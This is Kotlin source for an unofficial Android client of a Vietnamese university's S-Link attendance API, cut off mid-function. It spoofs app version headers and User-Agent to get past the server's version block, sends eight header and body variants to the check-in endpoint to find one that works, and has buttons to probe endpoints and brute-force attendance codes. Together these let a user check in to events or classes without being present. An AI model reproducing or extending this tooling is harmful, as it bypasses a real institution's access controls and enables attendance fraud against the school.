package com.ptit.slinkmini

import android.app.AlertDialog
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Bundle
import android.provider.OpenableColumns
import android.text.InputType
import android.util.Log
import android.view.View
import android.widget.*
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.google.zxing.BinaryBitmap
import com.google.zxing.MultiFormatReader
import com.google.zxing.RGBLuminanceSource
import com.google.zxing.common.HybridBinarizer
import com.journeyapps.barcodescanner.ScanContract
import com.journeyapps.barcodescanner.ScanOptions
import org.json.JSONArray
import org.json.JSONObject

class MainActivity : AppCompatActivity() {

    private lateinit var session: Session
    private lateinit var status: TextView
    private lateinit var loginBox: LinearLayout
    private lateinit var homeBox: LinearLayout
    private lateinit var settingsBox: LinearLayout
    private lateinit var manualQr: EditText
    private lateinit var partIn: EditText
    private lateinit var tokenIn: EditText
    private lateinit var uploadResult: TextView

    // ============================================================
    // VERSION — 80064 là bản server CHẤP NHẬN cho POST /qr.
    // Probe xác nhận: GET endpoint không chặn version, chỉ POST /qr.
    // ============================================================
    private val appVersionName = "2.3.6"
    private val appVersionCode = "80064"

    private enum class Flow { NONE, CAMERA_SCAN, IMAGE_QR, PHOTO_CHECKIN }
    private var flow = Flow.NONE
    private var pendingPhotoMa: String = ""
    private var lastMa: String = ""
    private var lastQr: String = ""

    @Volatile private var bruteCancel = false
    private var bruteThread: Thread? = null

    private companion object {
        const val TAG = "SLINK"
        const val TAG_PROBE = "SLINK_PROBE"
    }

    // ========== Launchers ==========
    private val scanLauncher = registerForActivityResult(ScanContract()) { r ->
        val content = r.contents
        val mode = flow
        flow = Flow.NONE
        Log.d(TAG, "scan result: mode=$mode content=${content?.take(120)}")
        if (content == null) {
            status.text = "Đã huỷ quét QR"
            return@registerForActivityResult
        }
        when (mode) {
            Flow.CAMERA_SCAN -> {
                status.text = "✅ Đã quét QR\nĐang điểm danh…"
                doCheckIn(content)
            }
            Flow.PHOTO_CHECKIN -> {
                processPhotoCheckinQr(content)
            }
            else -> doCheckIn(content)
        }
    }

    private val pickImageLauncher = registerForActivityResult(
        ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        val mode = flow
        flow = Flow.NONE
        val ma = pendingPhotoMa
        pendingPhotoMa = ""
        Log.d(TAG, "pickImage result: mode=$mode uri=$uri ma=$ma")
        if (uri == null) {
            status.text = "Đã huỷ chọn ảnh"
            return@registerForActivityResult
        }
        when (mode) {
            Flow.IMAGE_QR -> decodeQrThenCheckin(uri)
            Flow.PHOTO_CHECKIN -> {
                if (ma.isBlank()) {
                    status.text = "Không có mã để điểm danh kèm ảnh"
                    return@registerForActivityResult
                }
                doUploadAndCheckin(uri, ma)
            }
            else -> doUploadOnly(uri)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        session = Session(this)
        setContentView(buildUi())
        handleIntent(intent)
        refreshUi()
        if (session.isLoggedIn()) {
            preparePartition()
            // Fallback ngay: server đã xác nhận partition = PTIT trong probe
            if (session.partitionCode.isBlank()) {
                session.partitionCode = "PTIT"
                Log.d(TAG, "partition fallback → PTIT (from probe)")
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleIntent(intent)
    }

    // ========== SSO ==========
    private fun handleIntent(intent: Intent) {
        val data = intent.data ?: return
        if (data.scheme == "ptit.auth" && data.host == "SignIn") {
            val code = data.getQueryParameter("code")
            val state = data.getQueryParameter("state")
            val error = data.getQueryParameter("error")
            val errorDesc = data.getQueryParameter("error_description")
            if (error != null) { status.text = "SSO lỗi: $error\n${errorDesc.orEmpty()}"; return }
            if (code.isNullOrBlank()) { status.text = "Không nhận được code"; return }
            if (state != session.pendingState) { status.text = "State mismatch"; return }
            exchangeCodeForToken(code)
        }
    }

    // ========== UI ==========
    private fun buildUi(): View {
        val scroll = ScrollView(this)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 96, 48, 48)
        }
        scroll.addView(root)
        root.addView(TextView(this).apply {
            text = "PTIT S-Link Mini (v$appVersionName/$appVersionCode)"
            textSize = 20f; setPadding(0, 0, 0, 24)
        })

        loginBox = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        loginBox.addView(Button(this).apply {
            text = "Đăng nhập qua SSO"; setOnClickListener { startSso() }
        })
        loginBox.addView(Button(this).apply {
            text = "Đã có token — Settings"; setOnClickListener { showSettings() }
        })
        root.addView(loginBox)

        homeBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; visibility = View.GONE
        }

        // ===== Khối 1: Điểm danh có ảnh (1 nút) =====
        homeBox.addView(sectionHeader("Điểm danh kèm ảnh xác thực"))
        homeBox.addView(Button(this).apply {
            text = "📷 Điểm danh kèm ảnh (1 nút)"
            setOnClickListener { startPhotoCheckinOneTap() }
        })

        // ===== Khối 2: Điểm danh không ảnh =====
        homeBox.addView(sectionHeader("Điểm danh không ảnh (nhanh)"))
        homeBox.addView(Button(this).apply {
            text = "📷 Quét QR bằng camera"
            setOnClickListener { startCameraScan() }
        })
        homeBox.addView(Button(this).apply {
            text = "⌨️ Nhập mã điểm danh"
            setOnClickListener { showManualDialog() }
        })
        homeBox.addView(Button(this).apply {
            text = "🖼️ Trích mã từ ảnh QR"
            setOnClickListener { startImageQr() }
        })
        manualQr = EditText(this).apply { hint = "Dán chuỗi QR (dự phòng)" }
        homeBox.addView(manualQr)
        homeBox.addView(Button(this).apply {
            text = "Điểm danh từ chuỗi QR đã dán"
            setOnClickListener {
                val s = manualQr.text.toString().trim()
                if (s.isNotEmpty()) doCheckIn(s)
            }
        })

        // ===== Khối 3: Debug / Test =====
        homeBox.addView(sectionHeader("Debug & Test"))
        homeBox.addView(Button(this).apply {
            text = "🔬 Test check-in variants (8 biến thể)"
            setOnClickListener { runVariantsWithInput() }
        })
        homeBox.addView(Button(this).apply {
            text = "🔍 Probe API endpoints"
            setOnClickListener { probeEndpoints() }
        })
        homeBox.addView(Button(this).apply {
            text = "🔢 Bruteforce mã"
            setOnClickListener { showBruteforceDialog() }
        })

        // ===== Khối 4: Tiện ích =====
        homeBox.addView(sectionHeader("Tiện ích"))
        homeBox.addView(Button(this).apply {
            text = "📤 Upload ảnh (không điểm danh)"
            setOnClickListener { flow = Flow.NONE; pickImageLauncher.launch("image/*") }
        })
        uploadResult = TextView(this).apply {
            textSize = 12f; setTextIsSelectable(true); setPadding(0, 8, 0, 8)
        }
        homeBox.addView(uploadResult)
        homeBox.addView(Button(this).apply {
            text = "Copy kết quả upload"
            setOnClickListener {
                val t = uploadResult.text.toString()
                if (t.isNotBlank()) {
                    (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
                        .setPrimaryClip(ClipData.newPlainText("result", t))
                    Toast.makeText(this@MainActivity, "Đã copy", Toast.LENGTH_SHORT).show()
                }
            }
        })

        // ===== Khối 5: Tài khoản =====
        homeBox.addView(sectionHeader("Tài khoản"))
        homeBox.addView(Button(this).apply {
            text = "Settings"; setOnClickListener { showSettings() }
        })
        homeBox.addView(Button(this).apply {
            text = "Đăng xuất"
            setOnClickListener {
                session.clear(); refreshUi(); status.text = "Đã đăng xuất"
            }
        })
        root.addView(homeBox)

        // ---- Settings ----
        settingsBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; visibility = View.GONE
        }
        tokenIn = EditText(this).apply {
            hint = "Paste access_token"; inputType = InputType.TYPE_CLASS_TEXT
        }
        partIn = EditText(this).apply { hint = "x-data-partition-code (mặc định PTIT)" }
        settingsBox.addView(tokenIn); settingsBox.addView(partIn)
        settingsBox.addView(Button(this).apply {
            text = "Lưu"
            setOnClickListener {
                val t = tokenIn.text.toString().trim()
                if (t.isNotBlank()) session.accessToken = t
                val p = partIn.text.toString().trim()
                session.partitionCode = p.ifBlank { "PTIT" }
                status.text = "Đã lưu"; refreshUi()
                if (session.isLoggedIn()) preparePartition()
            }
        })
        settingsBox.addView(Button(this).apply {
            text = "Quay lại"; setOnClickListener { refreshUi() }
        })
        root.addView(settingsBox)

        status = TextView(this).apply {
            textSize = 12f; setPadding(0, 20, 0, 0); setTextIsSelectable(true)
        }
        root.addView(status)
        return scroll
    }

    private fun sectionHeader(text: String): TextView = TextView(this).apply {
        this.text = text; textSize = 16f; setPadding(0, 24, 0, 8)
    }

    private fun refreshUi() {
        val logged = session.isLoggedIn()
        loginBox.visibility = if (logged) View.GONE else View.VISIBLE
        homeBox.visibility = if (logged) View.VISIBLE else View.GONE
        settingsBox.visibility = View.GONE
        partIn.setText(session.partitionCode)
    }

    private fun showSettings() {
        loginBox.visibility = View.GONE; homeBox.visibility = View.GONE
        settingsBox.visibility = View.VISIBLE
        tokenIn.setText(""); partIn.setText(session.partitionCode)
    }

    // ========== SSO ==========
    private fun startSso() {
        val verifier = Pkce.newCodeVerifier()
        val challenge = Pkce.challenge(verifier)
        val state = Pkce.newState()
        session.pendingVerifier = verifier; session.pendingState = state
        val url = Uri.parse(Config.AUTH_ENDPOINT).buildUpon()
            .appendQueryParameter("response_type", "code")
            .appendQueryParameter("client_id", Config.CLIENT_ID)
            .appendQueryParameter("redirect_uri", Config.REDIRECT_URI)
            .appendQueryParameter("scope", Config.SCOPE)
            .appendQueryParameter("state", state)
            .appendQueryParameter("code_challenge", challenge)
            .appendQueryParameter("code_challenge_method", "S256")
            .build().toString()
        status.text = "Đang mở SSO…"
        try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) }
        catch (e: Exception) { status.text = "Không mở được browser: ${e.message}" }
    }

    private fun exchangeCodeForToken(code: String) {
        val verifier = session.pendingVerifier
        if (verifier.isBlank()) { status.text = "Không có code_verifier"; return }
        val form = mapOf(
            "grant_type" to "authorization_code", "client_id" to Config.CLIENT_ID,
            "code" to code, "redirect_uri" to Config.REDIRECT_URI,
            "code_verifier" to verifier
        )
        Api.postForm(Config.TOKEN_ENDPOINT, form) { ok, body ->
            runOnUiThread {
                if (!ok) { status.text = "Đổi code lỗi: $body"; return@runOnUiThread }
                try {
                    val j = JSONObject(body)
                    session.accessToken = j.optString("access_token")
                    session.refreshToken = j.optString("refresh_token")
                    session.idToken = j.optString("id_token")
                    session.expiresAt = System.currentTimeMillis() + j.optLong("expires_in", 300) * 1000
                    session.pendingVerifier = ""; session.pendingState = ""
                    status.text = "Đăng nhập OK"; refreshUi(); preparePartition()
                } catch (e: Exception) { status.text = "Parse token lỗi: ${e.message}" }
            }
        }
    }

    private fun refreshAccessToken(onDone: (Boolean) -> Unit) {
        val rt = session.refreshToken
        if (rt.isBlank()) { onDone(false); return }
        val form = mapOf(
            "grant_type" to "refresh_token", "client_id" to Config.CLIENT_ID,
            "refresh_token" to rt
        )
        Api.postForm(Config.TOKEN_ENDPOINT, form) { ok, body ->
            runOnUiThread {
                if (!ok) { onDone(false); return@runOnUiThread }
                try {
                    val j = JSONObject(body)
                    session.accessToken = j.optString("access_token", session.accessToken)
                    session.refreshToken = j.optString("refresh_token", session.refreshToken)
                    session.expiresAt = System.currentTimeMillis() + j.optLong("expires_in", 300) * 1000
                    onDone(true)
                } catch (_: Exception) { onDone(false) }
            }
        }
    }

    // ========== Partition (có fallback PTIT) ==========
    private fun preparePartition() {
        val fromJwt = partitionFromJwt()
        if (fromJwt.isNotBlank()) { session.partitionCode = fromJwt; return }
        getWithAuth("/core/data-partition/user/many/me") { ok, body ->
            if (ok) try {
                val arr = JSONArray(body)
                if (arr.length() > 0) {
                    val o = arr.getJSONObject(0)
                    val code = o.optString("code").ifBlank {
                        o.optString("dataPartitionCode").ifBlank {
                            o.optString("ma").ifBlank { o.optString("id") }
                        }
                    }
                    if (code.isNotBlank()) session.partitionCode = code
                }
            } catch (_: Exception) {}
            if (session.partitionCode.isBlank()) {
                session.partitionCode = "PTIT"
                Log.d(TAG, "partition fallback → PTIT (probe confirmed)")
            }
        }
    }

    private fun partitionFromJwt(): String = try {
        val parts = session.accessToken.split(".")
        if (parts.size < 2) "" else {
            val payload = String(android.util.Base64.decode(
                parts[1],
                android.util.Base64.URL_SAFE or android.util.Base64.NO_PADDING or android.util.Base64.NO_WRAP
            ))
            val o = JSONObject(payload)
            o.optString("partition_code").ifBlank {
                o.optString("partitionCode").ifBlank {
                    o.optString("data_partition_code").ifBlank {
                        val a = o.optJSONArray("partition_codes")
                        if (a != null && a.length() > 0) a.getString(0) else ""
                    }
                }
            }
        }
    } catch (_: Exception) { "" }

    // ========== Headers ==========
    private fun authHeaders(): Map<String, String> {
        val h = mutableMapOf(
            "Authorization" to "Bearer ${session.accessToken}",
            "Content-Type" to "application/json",
            "Accept" to "application/json",
            "Accept-Language" to "vi-VN,vi;q=0.9,en;q=0.8",
            "X-App-Version" to appVersionName,
            "X-Client-Version" to appVersionName,
            "X-Version" to appVersionName,
            "App-Version" to appVersionName,
            "X-App-VersionCode" to appVersionCode,
            "X-Client-VersionCode" to appVersionCode,
            "X-App-Platform" to "android",
            "X-Platform" to "android",
            "X-Client-Id" to Config.CLIENT_ID,
            "User-Agent" to "PTIT-S-Link/$appVersionName (Android; $appVersionCode)"
        )
        if (session.partitionCode.isNotBlank()) h["x-data-partition-code"] = session.partitionCode
        return h
    }

    private fun getWithAuth(path: String, onResult: (Boolean, String) -> Unit) =
        requestWithAuth("GET", path, null, onResult)

    private fun postWithAuth(path: String, body: String, onResult: (Boolean, String) -> Unit) =
        requestWithAuth("POST", path, body, onResult)

    private fun requestWithAuth(method: String, path: String, body: String?,
                                onResult: (Boolean, String) -> Unit) {
        val url = Config.API_URL.trimEnd('/') + "/" + path.trimStart('/')
        Log.d(TAG, "→ $method $url body=${body?.take(200)}")
        val cb: (Boolean, String) -> Unit = { ok, resp ->
            Log.d(TAG, "← $method $url ok=$ok resp=${resp.take(400)}")
            if (!ok && (resp.contains("401") || resp.contains("TokenInvalid", true))) {
                refreshAccessToken { refreshed ->
                    if (refreshed) requestWithAuth(method, path, body, onResult)
                    else onResult(false, resp)
                }
            } else onResult(ok, resp)
        }
        if (method == "GET") Api.get(url, authHeaders(), cb)
        else Api.postJson(url, body ?: "{}", authHeaders(), cb)
    }

    private fun isVersionBlocked(resp: String): Boolean {
        val r = resp.lowercase()
        return r.contains("update phiên bản") ||
               r.contains("update phien ban") ||
               r.contains("update app")
    }

    // ========== FLOW 1: Điểm danh kèm ảnh (1 nút) ==========
    private fun startPhotoCheckinOneTap() {
        val qrText = manualQr.text.toString().trim()
        if (qrText.isNotBlank()) {
            processPhotoCheckinQr(qrText)
        } else {
            flow = Flow.PHOTO_CHECKIN
            status.text = "Bước 1/2: Quét QR sự kiện"
            startScan()
        }
    }

    private fun processPhotoCheckinQr(qr: String) {
        val parsed = QrParser.parse(qr)
        if (parsed == null) { status.text = "QR không hợp lệ:\n$qr"; return }
        if (parsed.module != "SU_KIEN" || parsed.action != "CHECK_IN") {
            status.text = "Chỉ hỗ trợ SU_KIEN|CHECK_IN\nNhận: ${parsed.module}|${parsed.action}"
            return
        }
        val ma = try { JSONObject(parsed.data).optString("maDiemDanh") }
                 catch (_: Exception) { "" }
        if (ma.isBlank()) { status.text = "QR thiếu maDiemDanh"; return }
        lastMa = ma
        lastQr = qr
        pendingPhotoMa = ma
        flow = Flow.PHOTO_CHECKIN
        status.text = "Bước 2/2: Chọn ảnh xác thực\nma=$ma"
        pickImageLauncher.launch("image/*")
    }

    // ========== FLOW 2: Quét QR (không ảnh) ==========
    private fun startCameraScan() {
        flow = Flow.CAMERA_SCAN
        status.text = "Đưa QR sự kiện vào khung"
        startScan()
    }

    // ========== FLOW 3: Nhập mã ==========
    private fun showManualDialog() {
        val input = EditText(this).apply {
            hint = "Mã điểm danh (VD: 153591)"
            inputType = InputType.TYPE_CLASS_NUMBER
        }
        AlertDialog.Builder(this)
            .setTitle("Nhập mã điểm danh")
            .setMessage("Mã hiển thị tại sự kiện.")
            .setView(input)
            .setPositiveButton("Điểm danh") { _, _ ->
                val code = input.text.toString().trim()
                if (code.isBlank()) { status.text = "Chưa nhập mã"; return@setPositiveButton }
                lastMa = code
                doCheckInWithMa(code)
            }
            .setNegativeButton("Huỷ", null)
            .show()
    }

    // ========== FLOW 4: Trích mã từ ảnh QR ==========
    private fun startImageQr() {
        flow = Flow.IMAGE_QR
        status.text = "Chọn ảnh có chứa QR sự kiện"
        pickImageLauncher.launch("image/*")
    }

    private fun decodeQrThenCheckin(uri: Uri) {
        status.text = "Đang đọc ảnh và giải mã QR…"
        try {
            val bytes = contentResolver.openInputStream(uri)?.use { it.readBytes() }
            if (bytes == null || bytes.isEmpty()) { status.text = "Không đọc được ảnh"; return }
            val decodedQr = decodeQrFromBytes(bytes)
            if (decodedQr == null) {
                status.text = "❌ Không tìm thấy QR trong ảnh.\nThử ảnh rõ hơn hoặc dùng 'Nhập mã'."
                return
            }
            Log.d(TAG, "decoded QR from image: ${decodedQr.take(120)}")
            doCheckIn(decodedQr)
        } catch (e: Exception) {
            status.text = "Lỗi đọc ảnh: ${e.message}"
            Log.e(TAG, "decodeQrThenCheckin", e)
        }
    }

    private fun decodeQrFromBytes(bytes: ByteArray): String? {
        return try {
            val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return null
            val w = bmp.width; val h = bmp.height
            val pixels = IntArray(w * h)
            bmp.getPixels(pixels, 0, w, 0, 0, w, h)
            val source = RGBLuminanceSource(w, h, pixels)
            val binary = BinaryBitmap(HybridBinarizer(source))
            MultiFormatReader().decode(binary).text
        } catch (e: Exception) {
            Log.w(TAG, "decodeQrFromBytes fail: ${e.message}"); null
        }
    }

    // ========== ĐIỂM DANH ==========
    private fun doCheckInWithMa(ma: String) {
        lastMa = ma
        val body = JSONObject()
            .put("ma", ma)
            .put("loaiQR", "Tham gia")
            .toString()
        status.text = "Đang check-in sự kiện (không ảnh)…\nma=$ma\nPartition=${session.partitionCode.ifBlank { "(empty)" }}"
        postWithAuth("/slink/sv-su-kien/qr", body) { ok, resp ->
            runOnUiThread {
                if (ok && resp.contains("\"success\":true")) {
                    status.text = "✅ Điểm danh thành công\n$resp"
                } else if (isVersionBlocked(resp)) {
                    status.text = "❌ Server từ chối (v$appVersionCode)\n$resp\n\n" +
                        "→ Thử nút '🔬 Test check-in variants' để tìm body/header đúng."
                } else {
                    status.text = "❌ Lỗi: $resp\n\nma=$ma"
                }
            }
        }
    }

    private fun doCheckIn(qr: String) {
        lastQr = qr
        val parsed = QrParser.parse(qr)
        if (parsed == null) { status.text = "QR không hợp lệ:\n$qr"; return }
        status.text = "Đang xử lý: ${parsed.module}|${parsed.action}"
        Log.d(TAG, "doCheckIn: module=${parsed.module} action=${parsed.action}")
        when {
            parsed.module == "SU_KIEN" && parsed.action == "CHECK_IN" -> {
                try {
                    val ma = JSONObject(parsed.data).optString("maDiemDanh")
                    if (ma.isBlank()) { status.text = "QR thiếu maDiemDanh"; return }
                    doCheckInWithMa(ma)
                } catch (e: Exception) { status.text = "Parse QR lỗi: ${e.message}" }
            }
            parsed.action.contains("DIEM_DANH", true) -> {
                val otp = parsed.otp.orEmpty().trim()
                if (otp.isBlank()) { status.text = "QR lớp không có otp"; return }
                val maNhomQr = extractMaNhomQr(parsed.data)
                val body = JSONObject().put("otp", otp).put("maNhomQr", maNhomQr).toString()
                status.text = "Đang điểm danh lớp…\notp=$otp\nmaNhomQr=$maNhomQr"
                postWithAuth("/qldt/diem-danh/user/qr", body) { ok, resp ->
                    runOnUiThread {
                        if (ok) status.text = "✅ Điểm danh lớp thành công\n$resp"
                        else status.text = "❌ Lỗi: $resp\n\nQR: $qr"
                    }
                }
            }
            else -> status.text = "Chưa hỗ trợ: ${parsed.module}|${parsed.action}\n$qr"
        }
    }

    // ========== UPLOAD + CHECKIN ==========
    private fun doUploadAndCheckin(uri: Uri, ma: String) {
        status.text = "Bước 1/2: Đọc ảnh…\nma=$ma"
        try {
            val resolver = contentResolver
            var displayName = "image.jpg"
            val mime = resolver.getType(uri) ?: "image/jpeg"
            resolver.query(uri, null, null, null, null)?.use { c ->
                if (c.moveToFirst()) {
                    val idx = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
                    if (idx >= 0) displayName = c.getString(idx) ?: displayName
                }
            }
            val bytes = resolver.openInputStream(uri)?.use { it.readBytes() }
            if (bytes == null || bytes.isEmpty()) { status.text = "Không đọc được ảnh"; return }

            status.text = "Bước 1/2: Upload ảnh (${bytes.size / 1024} KB)…\nma=$ma"
            val url = Config.API_URL.trimEnd('/') + "/slink/file"
            val headers = authHeaders().toMutableMap().apply { remove("Content-Type") }
            Log.d(TAG, "upload: url=$url size=${bytes.size} name=$displayName")

            Api.uploadFile(url, bytes, displayName, mime, headers, "file") { ok, resp ->
                Log.d(TAG, "upload result: ok=$ok resp=${resp.take(400)}")
                runOnUiThread {
                    if (!ok) {
                        if (isVersionBlocked(resp)) {
                            status.text = "❌ Upload bị chặn version $appVersionCode\n$resp"
                        } else {
                            status.text = "❌ Upload thất bại\n$resp\n\nma=$ma"
                        }
                        return@runOnUiThread
                    }
                    val fileId = extractFileId(resp)
                    if (fileId.isBlank()) {
                        status.text = "⚠️ Upload OK nhưng không tìm được fileId.\n\n" +
                            "Response nguyên văn:\n$resp\n\n" +
                            "→ Copy khối này gửi để fix field name."
                        return@runOnUiThread
                    }
                    session.lastUploadedFileId = fileId
                    status.text = "Upload OK (fileId=$fileId)\nBước 2/2: Đang điểm danh…"
                    Log.d(TAG, "check-in: ma=$ma fileId=$fileId")

                    val body = JSONObject()
                        .put("ma", ma)
                        .put("loaiQR", "Tham gia")
                        .put("fileId", fileId)
                        .toString()
                    postWithAuth("/slink/sv-su-kien/qr", body) { ok2, resp2 ->
                        runOnUiThread {
                            if (ok2 && resp2.contains("\"success\":true")) {
                                status.text = "✅ Điểm danh kèm ảnh thành công\n$resp2"
                                session.lastUploadedFileId = ""
                            } else if (isVersionBlocked(resp2)) {
                                status.text = "❌ Server từ chối (v$appVersionCode)\n$resp2\n\n" +
                                    "→ Thử nút '🔬 Test check-in variants'."
                            } else {
                                status.text = "❌ Điểm danh lỗi: $resp2\n\n" +
                                    "ma=$ma\nfileId=$fileId\n\n" +
                                    "→ Nếu báo thiếu field ảnh, thử variants."
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            status.text = "Lỗi upload: ${e.message}"
            Log.e(TAG, "doUploadAndCheckin", e)
        }
    }

    private fun extractFileId(resp: String): String {
        return try {
            val j = JSONObject(resp)
            val fromData = j.optJSONObject("data")
            fromData?.optJSONObject("file")?.optString("_id").orEmpty().ifBlank {
                fromData?.optJSONObject("file")?.optString("id").orEmpty().ifBlank {
                    fromData?.optString("_id").orEmpty().ifBlank {
                        fromData?.optString("id").orEmpty().ifBlank {
                            j.optString("fileId").ifBlank {
                                j.optJSONObject("file")?.optString("_id").orEmpty()
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "extractFileId fail: ${e.message}"); ""
        }
    }

    // ========== VARIANT TESTING ==========
    private fun runVariantsWithInput() {
        val existing = lastMa
        if (existing.isNotBlank()) {
            testCheckInVariants(existing)
            return
        }
        val input = EditText(this).apply {
            hint = "Mã để test (VD: 153591)"
            inputType = InputType.TYPE_CLASS_NUMBER
        }
        AlertDialog.Builder(this)
            .setTitle("Test check-in variants")
            .setMessage("Nhập mã điểm danh. Sẽ thử 8 biến thể body/header để tìm cái server chấp nhận.")
            .setView(input)
            .setPositiveButton("Chạy") { _, _ ->
                val m = input.text.toString().trim()
                if (m.isNotBlank()) testCheckInVariants(m)
            }
            .setNegativeButton("Huỷ", null)
            .show()
    }

    private fun testCheckInVariants(ma: String) {
        status.text = "Đang lấy danh sách sự kiện đã tham gia…"
        getWithAuth("/slink/sv-su-kien/me/page?page=1&limit=1") { ok, resp ->
            runOnUiThread {
                var idSuKien = ""
                var idDotChamDiem = ""
                var cauHinhMinhChungId = ""
                if (ok) try {
                    val arr = JSONObject(resp).getJSONObject("data").getJSONArray("result")
                    if (arr.length() > 0) {
                        val o = arr.getJSONObject(0)
                        idSuKien = o.optString("idSuKien")
                        idDotChamDiem = o.optString("idDotChamDiem")
                        cauHinhMinhChungId = o.optString("cauHinhMinhChungId")
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "parse events fail: ${e.message}")
                }

                Log.d(TAG, "events: idSuKien=$idSuKien idDot=$idDotChamDiem cauHinh=$cauHinhMinhChungId")

                val variants = mutableListOf<Triple<String, String, Map<String, String>>>()

                // A: body tối thiểu + partition header
                variants.add(Triple(
                    "A_minimal",
                    JSONObject().put("ma", ma).put("loaiQR", "Tham gia").toString(),
                    mapOf("x-data-partition-code" to "PTIT")
                ))
                // B: partition trong body
                variants.add(Triple(
                    "B_body_partition",
                    JSONObject().put("ma", ma).put("loaiQR", "Tham gia")
                        .put("dataPartitionCode", "PTIT").toString(),
                    mapOf("x-data-partition-code" to "PTIT")
                ))
                // C: có idSuKien
                if (idSuKien.isNotBlank()) {
                    variants.add(Triple(
                        "C_with_idSuKien",
                        JSONObject().put("ma", ma).put("loaiQR", "Tham gia")
                            .put("idSuKien", idSuKien).toString(),
                        mapOf("x-data-partition-code" to "PTIT")
                    ))
                }
                // D: full body
                if (idSuKien.isNotBlank() && idDotChamDiem.isNotBlank()) {
                    variants.add(Triple(
                        "D_full",
                        JSONObject().put("ma", ma).put("loaiQR", "Tham gia")
                            .put("idSuKien", idSuKien)
                            .put("idDotChamDiem", idDotChamDiem)
                            .put("cauHinhMinhChungId", cauHinhMinhChungId)
                            .put("dataPartitionCode", "PTIT").toString(),
                        mapOf("x-data-partition-code" to "PTIT")
                    ))
                }
                // E: version 80075 + PTIT
                variants.add(Triple(
                    "E_v80075",
                    JSONObject().put("ma", ma).put("loaiQR", "Tham gia").toString(),
                    mapOf("x-data-partition-code" to "PTIT",
                          "X-App-Version" to "2.3.9",
                          "X-App-VersionCode" to "80075")
                ))
                // F: no version headers
                variants.add(Triple(
                    "F_no_version",
                    JSONObject().put("ma", ma).put("loaiQR", "Tham gia").toString(),
                    mapOf("x-data-partition-code" to "PTIT")
                ))
                // G: UA app gốc 2.3.9
                variants.add(Triple(
                    "G_ua_239",
                    JSONObject().put("ma", ma).put("loaiQR", "Tham gia").toString(),
                    mapOf("x-data-partition-code" to "PTIT",
                          "User-Agent" to "PTIT-S-Link/2.3.9 (Android; 80075)")
                ))
                // H: loaiQR tiếng Anh
                variants.add(Triple(
                    "H_loaiQR_JOIN",
                    JSONObject().put("ma", ma).put("loaiQR", "JOIN").toString(),
                    mapOf("x-data-partition-code" to "PTIT")
                ))

                runVariants(variants, 0, StringBuilder().apply {
                    append("=== VARIANTS TEST ===\n")
                    append("ma=$ma\n")
                    append("v=$appVersionName/$appVersionCode\n")
                    append("partition=${session.partitionCode}\n")
                    append("idSuKien=$idSuKien\n\n")
                }, ma)
            }
        }
    }

    private fun runVariants(
        variants: List<Triple<String, String, Map<String, String>>>,
        idx: Int,
        log: StringBuilder,
        ma: String
    ) {
        if (idx >= variants.size) {
            runOnUiThread {
                log.append("\n=== DONE ===\n")
                status.text = log.toString()
            }
            return
        }
        val (name, body, overrides) = variants[idx]
        val url = Config.API_URL.trimEnd('/') + "/slink/sv-su-kien/qr"
        val headers = authHeaders().toMutableMap().apply { putAll(overrides) }
        // Variant F: xoá hết header version
        if (name == "F_no_version") {
            headers.remove("X-App-Version"); headers.remove("X-App-VersionCode")
            headers.remove("X-Client-Version"); headers.remove("X-Client-VersionCode")
            headers.remove("X-Version"); headers.remove("App-Version")
        }

        Log.d(TAG, "variant $name: body=$body")
        runOnUiThread {
            log.append("⏳ $name\n")
            status.text = log.toString()
        }

        Api.postJson(url, body, headers) { ok, resp ->
            val preview = resp.take(400)
            Log.d(TAG, "variant $name ← ok=$ok resp=$preview")
            val isSuccess = ok && resp.contains("\"success\":true")
            runOnUiThread {
                log.append("────────────────────\n")
                log.append("$name  ok=$ok" + if (isSuccess) "  🎯" else "" + "\n")
                log.append("resp: $preview\n\n")
                status.text = log.toString()
            }
            runVariants(variants, idx + 1, log, ma)
        }
    }

    // ========== Quét QR ==========
    private fun startScan() {
        val o = ScanOptions()
        o.setDesiredBarcodeFormats(ScanOptions.QR_CODE)
        o.setPrompt("Đưa QR điểm danh vào khung")
        o.setBeepEnabled(false); o.setOrientationLocked(false)
        scanLauncher.launch(o)
    }

    private fun extractMaNhomQr(data: String): String {
        try {
            val o = JSONObject(data)
            for (k in listOf("maNhomQr", "ma_nhom_qr", "nhomQr", "ma"))
                if (o.has(k)) return o.getString(k)
        } catch (_: Exception) {}
        try {
            val raw = String(android.util.Base64.decode(data, android.util.Base64.DEFAULT))
            val o = JSONObject(raw)
            if (o.has("maNhomQr")) return o.getString("maNhomQr")
        } catch (_: Exception) {}
        return data
    }

    // ========== Upload ảnh không điểm danh ==========
    private fun doUploadOnly(uri: Uri) {
        uploadResult.text = "Đang đọc ảnh…"
        try {
            val resolver = contentResolver
            var displayName = "image.jpg"
            val mime = resolver.getType(uri) ?: "image/jpeg"
            resolver.query(uri, null, null, null, null)?.use { c ->
                if (c.moveToFirst()) {
                    val idx = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
                    if (idx >= 0) displayName = c.getString(idx) ?: displayName
                }
            }
            val bytes = resolver.openInputStream(uri)?.use { it.readBytes() }
            if (bytes == null || bytes.isEmpty()) { uploadResult.text = "Không đọc được ảnh"; return }
            uploadResult.text = "Đang upload (${bytes.size / 1024} KB)…"
            val url = Config.API_URL.trimEnd('/') + "/slink/file"
            val headers = authHeaders().toMutableMap().apply { remove("Content-Type") }
            Api.uploadFile(url, bytes, displayName, mime, headers, "file") { ok, resp ->
                runOnUiThread {
